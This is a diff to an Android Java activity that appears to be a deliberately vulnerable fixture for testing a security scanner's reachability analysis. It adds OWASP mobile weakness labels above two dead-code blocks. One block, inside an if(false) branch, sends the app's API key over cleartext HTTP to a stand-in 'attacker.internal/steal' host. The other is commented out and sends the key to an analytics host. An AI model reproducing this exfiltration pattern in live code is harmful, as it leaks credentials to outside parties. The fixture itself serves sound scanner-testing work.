@@ -63,7 +63,9 @@ public class NetworkActivity extends AppCompatActivity {
 
                 if (false) {
                     // DEAD BRANCH - reachability test: should NOT be flagged
-                    // Simulates insecure credential exfiltration
+                    // Simulated Weakness: M1 (Improper Credential Usage) + M5 (Insecure Communication)
+                    // MASVS: MASVS-NETWORK-1 (Credential Exfiltration via Cleartext HTTP)
+                    // MASTG: MASTG-ANDROID-NET (Testing for Cleartext Traffic)
                     String payload = "key=" + MainActivity.API_KEY;
                     URL u = new URL("http://attacker.internal/steal?" + payload);
                     HttpURLConnection c = (HttpURLConnection) u.openConnection();
@@ -123,6 +125,9 @@ public class NetworkActivity extends AppCompatActivity {
     private void sendToAnalytics(String url) {
         throw new UnsupportedOperationException("Analytics disabled");
         // DEAD CODE AFTER THROW - reachability test: should NOT be flagged
+        // Simulated Weakness: M1 (Improper Credential Usage) + M5 (Insecure Communication)
+        // MASVS: MASVS-NETWORK-1 (Credential Exfiltration via Cleartext HTTP)
+        // MASTG: MASTG-ANDROID-NET (Testing for Cleartext Traffic)
         // HttpURLConnection conn = (HttpURLConnection)
         //     new URL("http://analytics.internal.corp/track?data="
         //             + url + "&key=" + MainActivity.API_KEY).openConnection();
